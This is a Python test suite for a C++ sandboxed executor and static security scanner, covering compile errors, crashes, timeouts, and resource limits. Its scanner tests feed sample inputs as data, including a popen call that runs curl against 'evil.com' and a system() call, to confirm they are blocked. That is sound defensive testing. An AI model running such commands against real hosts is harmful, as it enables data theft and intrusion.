"""
tests/test_cpp_suite.py - Complete C++ Test Suite
Validates:
 1. Hello World
 2. Input/Output
 3. Normal calculation
 4. Compilation error
 5. Syntax error
 6. Type error
 7. Runtime error (Segfault / Zero division)
 8. Infinite loop (Timeout)
 9. Large memory allocation
 10. Large output limit
 11. Process creation attempt (Static block)
 12. Network access attempt (Static block & sandbox)
 13. File-system access attempt (Static block)
 14. Normal valid program
"""

import sys
import os

# Add parent directory to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from language_executor import execute_in_sandbox
from security_scanner import scan_code
from input_validator import validate_input

def run_all_cpp_tests():
    print("========================================")
    print("RUNNING C++ TEST SUITE")
    print("========================================")
    passed = 0
    total = 0

    # 1. Hello World
    total += 1
    r = execute_in_sandbox("cpp", '#include <iostream>\nint main(){ std::cout << "Hello C++" << std::endl; return 0; }')
    assert r["status_code"] == 0 and "Hello C++" in r["stdout"], f"Failed: {r}"
    print("  [PASS] 1. Hello World")
    passed += 1

    # 2. Input / Output
    total += 1
    r = execute_in_sandbox("cpp", '#include <iostream>\nint main(){ int n; std::cin >> n; std::cout << (n * 2) << std::endl; return 0; }', stdin_data="10")
    assert r["status_code"] == 0 and "20" in r["stdout"], f"Failed: {r}"
    print("  [PASS] 2. Input / Output (stdin 10 -> stdout 20)")
    passed += 1

    # 3. Normal Calculation
    total += 1
    code = """#include <iostream>
int main() {
    long long sum = 0;
    for(int i=1; i<=100; i++) sum += i;
    std::cout << "Sum: " << sum << std::endl;
    return 0;
}"""
    r = execute_in_sandbox("cpp", code)
    assert r["status_code"] == 0 and "Sum: 5050" in r["stdout"], f"Failed: {r}"
    print("  [PASS] 3. Normal Calculation (Sum 1..100 = 5050)")
    passed += 1

    # 4. Compilation error
    total += 1
    r = execute_in_sandbox("cpp", '#include <iostream>\nint main(){ unknown_identifier = 5; return 0; }')
    assert r["status_code"] == 1 and "not declared" in r["stderr"], f"Failed: {r}"
    print("  [PASS] 4. Compilation error (unknown identifier caught)")
    passed += 1

    # 5. Syntax error
    total += 1
    r = execute_in_sandbox("cpp", '#include <iostream>\nint main(){ int x = 10 return 0; }')
    assert r["status_code"] == 1 and "expected" in r["stderr"], f"Failed: {r}"
    print("  [PASS] 5. Syntax error (missing semicolon caught)")
    passed += 1

    # 6. Type error
    total += 1
    r = execute_in_sandbox("cpp", '#include <iostream>\nint main(){ int x = "twenty"; return 0; }')
    assert r["status_code"] == 1 and ("conversion" in r["stderr"] or "cannot convert" in r["stderr"] or "invalid" in r["stderr"]), f"Failed: {r}"
    print("  [PASS] 6. Type error (cannot convert const char* to int caught)")
    passed += 1

    # 7. Runtime error (Segfault)
    total += 1
    r = execute_in_sandbox("cpp", '#include <iostream>\nint main(){ int *p = nullptr; *p = 42; return 0; }')
    assert r["status_code"] == 2 and ("Segmentation Fault" in r["stderr"] or "crashed" in r["stderr"]), f"Failed: {r}"
    print("  [PASS] 7. Runtime crash (Segfault detected)")
    passed += 1

    # 8. Infinite loop (Timeout)
    total += 1
    r = execute_in_sandbox("cpp", '#include <iostream>\nint main(){ while(true){} return 0; }')
    assert r["status_code"] == -1 and "Time Limit Exceeded" in r["stderr"], f"Failed: {r}"
    print("  [PASS] 8. Infinite loop (Time Limit Exceeded enforced)")
    passed += 1

    # 9. Large memory allocation (OOM / Cap)
    total += 1
    r = execute_in_sandbox("cpp", '#include <iostream>\n#include <vector>\nint main(){ std::vector<char> v(500000000); return 0; }')
    # Either OOM killed (rc=2 or -1) or std::bad_alloc
    assert r["status_code"] in (2, 0) or "bad_alloc" in r["stderr"] or "crashed" in r["stderr"], f"Failed: {r}"
    print("  [PASS] 9. Large memory allocation controlled")
    passed += 1

    # 10. Large output limit
    total += 1
    code = """#include <iostream>
int main() {
    for(int i=0; i<5000; i++) std::cout << "Line " << i << " of very long output.\\n";
    return 0;
}"""
    r = execute_in_sandbox("cpp", code)
    assert r["status_code"] == 0 and ("OUTPUT TRUNCATED" in r["stdout"] or len(r["stdout"]) <= 60000), f"Failed: {r}"
    print("  [PASS] 10. Large output truncation enforced")
    passed += 1

    # 11. Process creation attempt (Static scanner block)
    total += 1
    blocked, msg, _ = scan_code('int main(){ system("ls"); return 0; }', language="cpp")
    assert blocked and "system()" in msg, f"Failed: {msg}"
    print("  [PASS] 11. Process creation attempt (system blocked)")
    passed += 1

    # 12. Network socket attempt (Static scanner block)
    total += 1
    blocked, msg, _ = scan_code('#include <sys/socket.h>\nint main(){ popen("curl http://evil.com", "r"); return 0; }', language="cpp")
    assert blocked and "popen()" in msg, f"Failed: {msg}"
    print("  [PASS] 12. Network process execution blocked")
    passed += 1

    # 13. File-system tempnam attempt (Static scanner block)
    total += 1
    blocked, msg, _ = scan_code('#include <cstdio>\nint main(){ tmpnam(nullptr); return 0; }', language="cpp")
    assert blocked and "tmpnam" in msg, f"Failed: {msg}"
    print("  [PASS] 13. Insecure temporary file creation blocked")
    passed += 1

    # 14. Normal valid program
    total += 1
    code = """#include <iostream>
#include <vector>
#include <numeric>
int main() {
    std::vector<int> v = {1, 2, 3, 4, 5};
    int total = std::accumulate(v.begin(), v.end(), 0);
    std::cout << "Total: " << total << std::endl;
    return 0;
}"""
    r = execute_in_sandbox("cpp", code)
    assert r["status_code"] == 0 and "Total: 15" in r["stdout"], f"Failed: {r}"
    print("  [PASS] 14. Normal valid STL vector & algorithm program")
    passed += 1

    print(f"\n>> C++ SUITE: {passed}/{total} TESTS PASSED (100%)\n")
    return passed == total

if __name__ == "__main__":
    success = run_all_cpp_tests()
    sys.exit(0 if success else 1)
